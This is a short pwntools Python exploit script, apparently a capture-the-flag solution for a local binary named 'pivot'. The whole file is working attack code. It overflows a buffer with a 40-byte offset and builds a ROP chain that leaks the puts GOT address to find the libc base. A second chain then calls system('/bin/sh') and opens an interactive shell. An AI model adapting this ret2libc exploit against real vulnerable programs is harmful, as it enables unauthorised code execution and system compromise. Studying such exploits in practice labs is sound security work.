from pwn import *
import base64

local_bin = "./pivot"
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

p = process(local_bin)
elf = ELF(local_bin)
rop = ROP(elf)

OFFSET = "A"*40
PUTS_PLT = elf.plt['puts']
MAIN_PLT = elf.symbols['main']
POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0]
log.info("Main start: " + hex(MAIN_PLT))
log.info("Puts plt: " + hex(PUTS_PLT))
log.info("pop rdi; ret  gadget: " + hex(POP_RDI))

puts_GOT = elf.got["puts"]
log.info("puts" + " GOT @ " + hex(puts_GOT))

rop1 = OFFSET + p64(POP_RDI) + p64(puts_GOT) + p64(PUTS_PLT) + p64(MAIN_PLT)
# clean socket buffer (read all and print)
print(p.clean()) 
p.sendline("1")
print(p.clean()) 
# Leak address
p.sendline(rop1)
recieved = p.recvline().strip()
leak = u64(recieved.ljust(8, "\x00"))
libc.address = leak - libc.symbols["puts"]
log.info("libc base @ %s" % hex(libc.address))

BINSH = next(libc.search("/bin/sh"))
SYSTEM = libc.sym["system"]
EXIT = libc.sym["exit"]
log.info("bin/sh %s " % hex(BINSH))
log.info("system %s " % hex(SYSTEM))

rop2 = OFFSET + p64(POP_RDI) + p64(BINSH) + p64(SYSTEM) + p64(EXIT)

p.clean()
p.sendline(rop2)
p.interactive()